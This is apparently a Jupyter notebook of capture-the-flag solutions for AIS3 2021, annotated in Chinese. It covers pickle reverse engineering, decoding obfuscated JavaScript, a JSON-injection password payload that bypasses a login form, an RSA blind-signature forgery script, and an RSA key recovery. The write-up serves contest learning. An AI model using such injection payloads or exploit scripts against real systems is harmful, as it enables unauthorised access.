# {
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b550fa47",
   "metadata": {},
   "source": [
    "# AIS3 2021"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1df4d234",
   "metadata": {},
   "source": [
    "## Peekora"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "16ede36b",
   "metadata": {},
   "source": [
    "執行 `python -m pickletools flag_checker.pkl` \\\n",
    "得到\n",
    "```pickle\n",
    "    0: c    GLOBAL     '__builtin__ input'\n",
    "   19: (    MARK\n",
    "   20: S        STRING     'FLAG: '\n",
    "   30: t        TUPLE      (MARK at 19)\n",
    "   31: R    REDUCE\n",
    "   32: p    PUT        0\n",
    "   35: 0    POP\n",
    "   ︙\n",
    "  888: c    GLOBAL     '__builtin__ print'\n",
    "  907: (    MARK\n",
    "  908: S        STRING     'Correct!'\n",
    "  920: t        TUPLE      (MARK at 907)\n",
    "  921: R    REDUCE\n",
    "  922: .    STOP\n",
    "```\n",
    "大致等同執行 `In[1]`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "17ada1ab",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FLAG: AIS3{dAmwjzphIj}\n",
      "Correct!\n"
     ]
    }
   ],
   "source": [
    "m = {}\n",
    "m[0] = input('FLAG: ')\n",
    "m[1] = getattr\n",
    "m[2] = [exit, str]\n",
    "(str if m[0].startswith('AIS3{') else exit)()\n",
    "(str if m[0].endswith('}') else exit)()\n",
    "(str if m[0].endswith('}') else exit)()\n",
    "(str if m[0][6] == 'A' else exit)()\n",
    "(str if m[0][9] == 'j' else exit)()\n",
    "m[3] = m[0][9]\n",
    "(str if m[0][11] == 'p' else exit)()\n",
    "(str if m[0][14] == m[3] else exit)()\n",
    "m[4] = m[0][1]\n",
    "(str if m[0][5] == 'd' else exit)()\n",
    "(str if m[0][10] == 'z' else exit)()\n",
    "(str if m[0][12] == 'h' else exit)()\n",
    "(str if m[4] == m[0][13] else exit)()\n",
    "(str if m[0][8] == 'w' else exit)()\n",
    "(str if m[0][7] == 'm' else exit)()\n",
    "\"\"\"AIS3{dAmwjzphIj}\"\"\"\n",
    "print('Correct!')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3c61d39f",
   "metadata": {},
   "source": [
    "[![](https://i1.ytimg.com/vi/5HIAbc0cqx0/sd3.jpg)](https://youtu.be/5HIAbc0cqx0)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "70053600",
   "metadata": {},
   "source": [
    "## COLORS"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "364eb48e",
   "metadata": {},
   "source": [
    "先做 Pretty-Print \\\n",
    "發現指令觸發的最後一步，輸出 Encoded Flag\n",
    "```js\n",
    "document[_0x12b963(0x1e2)]('output')[_0x12b963(0x1d1)] = atob(_0x78ed5a)[_0x12b963(0x1e4)](/(.{1,3})/g)[_0x12b963(0x1e1)](_0x5efa9e=>_0x9f530c(_0x5efa9e[0x0], _0x5efa9e[0x1], _0x5efa9e[0x2]))[_0x12b963(0x1dd)]('')\n",
    "\n",
    "```\n",
    "以 `atob(_0x78ed5a)` 每 3 Char 一組，每組作為 EncodedFlagChar Element 的 Parameter"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3d344396",
   "metadata": {},
   "source": [
    "### Remark 1\n",
    "`_0x9f530c` 功能是 Generate String of EncodedFlagChar Element \\\n",
    "`_0x9f530c(class1: str, class2: str, textContent: str) -> str`\n",
    "\n",
    "`atob(_0x78ed5a) == '40B20g30i51J60601\\\\30w40130A41j40\\\\41130g70u30i10k30l40760x50i50X10K10I40h50X00K41i51l70670f40o10650570K11n51870741B50-11840w31a10r41z70K30=20=10='`\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "db4fb8c0",
   "metadata": {},
   "source": [
    "### Encoding Function\n",
    "```js\n",
    "function _0xce93(_0x1b497a) {\n",
    "    const _0x9fe181 = _0x1cd51f;\n",
    "    if (!_0x1b497a[_0x9fe181(0x1d0)])\n",
    "        return '';\n",
    "    let _0x4d62de = ''\n",
    "      , _0x23f867 = ''\n",
    "      , _0x5395cb = 0x0;\n",
    "    for (let _0x6e40b4 = 0x0; _0x6e40b4 < _0x1b497a[_0x9fe181(0x1d0)]; _0x6e40b4++)\n",
    "        _0x4d62de += _0x1b497a[_0x9fe181(0x1dc)](_0x6e40b4)['toString'](0x2)[_0x9fe181(0x1c6)](0x8, '0');\n",
    "    _0x5395cb = _0x4d62de[_0x9fe181(0x1d0)] % _0x317b6e / 0x2 - 0x1;\n",
    "    if (_0x5395cb != -0x1)\n",
    "        _0x4d62de += '0'[_0x9fe181(0x1c8)](_0x317b6e - _0x4d62de[_0x9fe181(0x1d0)] % _0x317b6e);\n",
    "    _0x4d62de = _0x4d62de[_0x9fe181(0x1e4)](/(.{1,10})/g);\n",
    "    for (let _0x13c6bb of _0x4d62de) {\n",
    "        let _0x192141 = parseInt(_0x13c6bb, 0x2);\n",
    "        _0x23f867 += _0x9f530c(_0x192141 >> 0x6 & 0x7, _0x192141 >> 0x9, atob(_0x24fcac)[_0x192141 & 0x3f]);\n",
    "    }\n",
    "    for (; _0x5395cb > 0x0; _0x5395cb--) {\n",
    "        _0x23f867 += _0x9f530c(_0x5395cb % _0x2a3765, 0x0, '=');\n",
    "    }\n",
    "    return _0x23f867;\n",
    "}\n",
    "```\n",
    "對於輸入 `_0x1b497a: str`，將每個 Char 轉換成 `8 bit`，再 `10 bit` 一組 \\\n",
    "將 `byte of 10 bit` 拆成三個 Parameter，生成 EncodedFlagChar Element \\\n",
    "`_0x9f530c(class1=byte[6:9], class2=byte[9], textContent=atob(_0x24fcac)[byte[0:6]])`"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "723fa517",
   "metadata": {},
   "source": [
    "### Remark 2\n",
    "雖然 `_0x5395cb` 於解 flag 並不至關重要，不過可以計算得到 `len(_0x1b497a) % 5 == 5 + ~_0x5395cb % 5`\n",
    "\n",
    "`atob(_0x24fcac) == 'AlS3{BasE64_i5+b0rNIng~\\\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}'`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "e182180e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<script src=\"http://quiz.ais3.org:8888/encode.js\"></script>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%HTML\n",
    "<script src=\"http://quiz.ais3.org:8888/encode.js\"></script>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "9dadde24",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "let _0x78ed5a = _0x4ebd(0x1ca)\n",
       "let _0x24fcac = _0x4ebd(0x1d4)\n",
       "IPython.notebook.kernel.execute(`encoded=${JSON.stringify(atob(_0x78ed5a))}`)\n",
       "IPython.notebook.kernel.execute(`to_bit_0_5=${JSON.stringify(atob(_0x24fcac))}`)\n"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%javascript\n",
    "let _0x78ed5a = _0x4ebd(0x1ca)\n",
    "let _0x24fcac = _0x4ebd(0x1d4)\n",
    "IPython.notebook.kernel.execute(`encoded=${JSON.stringify(atob(_0x78ed5a))}`)\n",
    "IPython.notebook.kernel.execute(`to_bit_0_5=${JSON.stringify(atob(_0x24fcac))}`)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "a456109e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'40B20g30i51J60601\\\\30w40130A41j40\\\\41130g70u30i10k30l40760x50i50X10K10I40h50X00K41i51l70670f40o10650570K11n51870741B50-11840w31a10r41z70K30=20=10='"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "encoded"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "7d1e883b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'AlS3{BasE64_i5+b0rNIng~\\\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "to_bit_0_5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "a30291ea",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'AIS3{base1024_15_c0l0RFuL_GAM3_CL3Ar_thIS_IS_y0Ur_FlaG!}'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bit_0_5 = encoded[2::3][:-3]\n",
    "bit_6_7 = encoded[0::3][:-3]\n",
    "bit_9 = encoded[1::3][:-3]\n",
    "\n",
    "bit_0_5 = map(to_bit_0_5.index, bit_0_5)\n",
    "bit_6_7 = map(int, bit_6_7)\n",
    "bit_9 = map(int, bit_9)\n",
    "\n",
    "bytes_of_10bit = (a | b << 6 | c << 9 for a, b, c in zip(bit_0_5, bit_6_7, bit_9))\n",
    "bits = ''.join(f'{byte:010b}' for byte in bytes_of_10bit)\n",
    "bytes_of_8bit = (bits[i:i+8] for i in range(0, len(bits)-8, 8))\n",
    "''.join(chr(int(byte, 2)) for byte in bytes_of_8bit)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9767c9bd",
   "metadata": {},
   "source": [
    "## ⲩⲉⲧ ⲁⲛⲟⲧⲏⲉꞅ 𝓵ⲟ𝓰ⲓⲛ ⲣⲁ𝓰ⲉ"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd4ec684",
   "metadata": {},
   "source": [
    "`Username = ''`\n",
    "\n",
    "`Password = '\",\"password\":null,\"showflag\":true,\"\":\"'`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "58494ea9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'AIS3{/r/badUIbattles?!?!}'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests\n",
    "data  = {'username': '', 'password': '\",\"password\":null,\"showflag\":true,\"\":\"'}\n",
    "url = 'http://quiz.ais3.org:8002/login'\n",
    "requests.post(url, data=data).text"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9b7d93b8",
   "metadata": {},
   "source": [
    "## ReSident evil villAge"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a0525064",
   "metadata": {},
   "source": [
    "令 `t == bytes_to_long(b'Ethan Winters')` \\\n",
    "Server 要求輸入 `sig` 使得 $sig^e = t$ in $\\mathbb Z_n$ \\\n",
    "可以從 Sevrer 得到 $sig^d\\ \\forall sig \\neq t$ in $\\mathbb Z_n$ \\\n",
    "如果可以找到 $a b = t$，則 $(a^d b^d)^e = t$ in $\\mathbb Z_n$"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "15ee180d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'AIS3{R3M383R_70_HAsh_7h3_M3Ssa93_83F0r3_S19N1N9}'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import sympy as sp\n",
    "import re\n",
    "from pwnlib.tubes.remote import remote\n",
    "\n",
    "def server_generator():\n",
    "    with remote('quiz.ais3.org', 42069) as r:\n",
    "        for privkey in re.findall(r'. = (\\d+)', r.recvS()):\n",
    "            msg = yield int(privkey)\n",
    "        for _ in range(2):\n",
    "            r.writeline('1')\n",
    "            r.recv()\n",
    "            r.writeline(msg)\n",
    "            msg = yield int(r.recvS().split()[1])\n",
    "        r.writeline('2')\n",
    "        r.recv()\n",
    "        r.writeline(msg)\n",
    "        yield r.recvS().split()[0]\n",
    "        \n",
    "server = server_generator()\n",
    "\n",
    "t = int.from_bytes(b'Ethan Winters', 'big')\n",
    "a, b = sp.factorint(t)\n",
    "\n",
    "n = server.send(None)\n",
    "e = server.send(None)\n",
    "a_d = server.send(f'{a:x}')\n",
    "b_d = server.send(f'{b:x}')\n",
    "t_d = a_d * b_d % n\n",
    "server.send(str(t_d))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0f7f9ce4",
   "metadata": {},
   "source": [
    "## Republic of South Africa"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aca7ebed",
   "metadata": {},
   "source": [
    "由[如何從碰撞過程求圓周率π？壹個奇妙的物理、代數、幾何結合問題](https://youtu.be/Un7mK05b9oA)，可得到 `count`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "2272c462",
   "metadata": {},
   "outputs": [],
   "source": [
    "n = 23662270311503602529211462628663973377651035055221337186547659666520360329842954292759496973737109678655075242892199643594552737098393308599593056828393773327639809644570618472781338585802514939812387999523164606025662379300143159103239039862833152034195535186138249963826772564309026532268561022599227047\n",
    "e = 65537\n",
    "c = 11458615427536252698065643586706850515055080432343893818398610010478579108516179388166781637371605857508073447120074461777733767824330662610330121174203247272860627922171793234818603728793293847713278049996058754527159158251083995933600335482394024095666411743953262490304176144151437205651312338816540536"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "fe372708",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'AIS3{https://www.youtube.com/watch?v=jsYwFizhncE}'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import sympy as sp\n",
    "count = int(sp.pi * 10 ** 152)\n",
    "r = n - count + 1\n",
    "d = pow(e, -1, r)\n",
    "f = pow(c, d, n)\n",
    "f.to_bytes(f.bit_length() // 8 + 1, 'big')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9660c743",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
